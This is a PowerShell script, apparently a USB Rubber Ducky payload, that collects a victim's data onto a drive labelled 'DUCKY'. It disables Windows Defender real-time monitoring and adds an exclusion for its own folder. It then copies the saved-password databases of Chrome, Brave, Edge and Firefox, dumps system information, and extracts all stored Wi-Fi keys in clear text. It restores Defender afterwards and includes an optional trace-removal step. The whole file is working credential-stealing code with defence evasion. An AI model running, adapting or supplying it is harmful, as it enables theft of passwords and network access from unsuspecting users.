# Configurable variables
$DRIVE = 'DUCKY'     # Volume label of the USB drive

# Find the USB drive by volume label
$duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.VolumeName -eq $DRIVE }).DeviceID
if (-not $duckletter) {
    Write-Host "USB drive '$DRIVE' not found. Exiting."
    exit 1
}
Set-Location $duckletter

# Set output and log paths on the USB drive
$OutputDir = "$duckletter\$env:USERNAME"
if (-Not (Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Path $OutputDir | Out-Null
}
$LogFile = "$OutputDir\browser_data_log_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

$BrowserProfiles = @{
    'Chrome'  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    'Brave'   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    'Edge'    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    'Firefox' = "$env:APPDATA\Mozilla\Firefox\Profiles"
}

function Log {
    param([string]$Message)
    Add-Content -Path $LogFile -Value "$(Get-Date -Format 'u') $Message"
}

function Invoke-Action {
    param(
        [scriptblock]$Action,
        [string]$Description,
        [object[]]$ArgumentList = @()
    )
    try {
        & $Action @ArgumentList
        Log "$($Description): Success"
    } catch {
        Log ($Description + ": Failed - " + $_.Exception.Message)
    }
}

function Disable-Defender {
    # Store current Defender state before modifying
    $global:OriginalDefenderState = Get-MpPreference | Select-Object DisableRealtimeMonitoring
    Invoke-Action -Action { Set-MpPreference -DisableRealtimeMonitoring $true } -Description "Disable Defender Real-Time Monitoring"
    Invoke-Action -Action { Add-MpPreference -ExclusionPath $OutputDir } -Description "Add Defender Exclusion"
}

function Restore-Defender {
    # Restore Defender Real-Time Monitoring to its original state
    if ($global:OriginalDefenderState) {
        Invoke-Action -Action { Set-MpPreference -DisableRealtimeMonitoring $global:OriginalDefenderState.DisableRealtimeMonitoring } -Description "Restore Defender Real-Time Monitoring"
    } else {
        Log "Original Defender state not captured, skipping real-time monitoring restoration."
    }
    Invoke-Action -Action { Remove-MpPreference -ExclusionPath $OutputDir } -Description "Remove Defender Exclusion"
}

function Get-BrowserData {
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    foreach ($browser in $BrowserProfiles.Keys) {
        $path = $BrowserProfiles[$browser]
        if ($browser -eq 'Firefox') {
            if (Test-Path $path) {
                Get-ChildItem $path -Directory | ForEach-Object {
                    $profilePath = $_.FullName
                    $loginDataFile = Join-Path $profilePath "logins.json" # Target logins.json
                    if (Test-Path $loginDataFile) { # Check for the specific file
                        $dest = Join-Path $OutputDir "$browser-$($_.Name)-logins.json"
                        $profileName = $_.Name
                        Invoke-Action -Action { param($src, $dst) Copy-Item $src $dst -Force } -Description "Copy $browser profile $profileName logins.json" -ArgumentList $loginDataFile, $dest # Copy the file
                    } else {
                        Log "Logins.json not found for Firefox profile $($_.Name) at $loginDataFile"
                    }
                }
            } else {
                Log "Firefox profiles directory not found at $path"
            }
        } else {
            $dest = Join-Path $OutputDir "$browser-LoginData"
            if (Test-Path $path) {
                Invoke-Action -Action { param($src, $dst) Copy-Item $src $dst -Force } -Description "Copy $browser Login Data" -ArgumentList $path, $dest
            } else {
                Log "Source file for $browser not found at $path"
            }
        }
    }
}

function Get-SystemInfo {
    $sysInfoFile = Join-Path $OutputDir "SystemInfo.txt"
    Invoke-Action -Action {
        Get-ComputerInfo | Out-File $sysInfoFile
    } -Description "Collect System Info"
}

function Get-WiFiCreds {
    $wifiFile = Join-Path $OutputDir "WiFiCreds.txt"
    Invoke-Action -Action {
        # Get all Wi-Fi profiles
        $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[1].Trim()
        }

        # Process each profile
        foreach ($profile in $profiles) {
            try {
                $profileDetails = (netsh wlan show profile name="$profile" key=clear) | Out-String
                
                # Robust extraction of "Key Content"
                $keyContentLine = $profileDetails | Select-String "Key Content"
                $keyContent = if ($keyContentLine) {
                    # Split on the first colon and take the second part, then trim
                    ($keyContentLine.ToString() -split ':', 2)[1].Trim()
                } else {
                    $null
                }

                if ($keyContent) {
                    "$profile : $keyContent" | Out-File -Append $wifiFile
                } else {
                    "$profile : No key content found (e.g., Open network, or security key not stored/available)." | Out-File -Append $wifiFile
                }
            }
            catch {
                Log "Failed to retrieve Wi-Fi key for profile '$profile': $($_.Exception.Message)"
            }
        }
    } -Description "Collect Wi-Fi Credentials"
}

function Cleanup {
    Invoke-Action -Action { Remove-Item $OutputDir -Recurse -Force } -Description "Cleanup Output Directory"
    Invoke-Action -Action { Remove-Item $LogFile -Force } -Description "Cleanup Log File"
}

# Main Execution
Disable-Defender
Get-BrowserData
Get-SystemInfo
Get-WiFiCreds
Restore-Defender

# Optional: Uncomment to cleanup after execution
# Cleanup

# Minimal user feedback
Write-Host "Data collection complete. Log: $LogFile Output: $OutputDir"

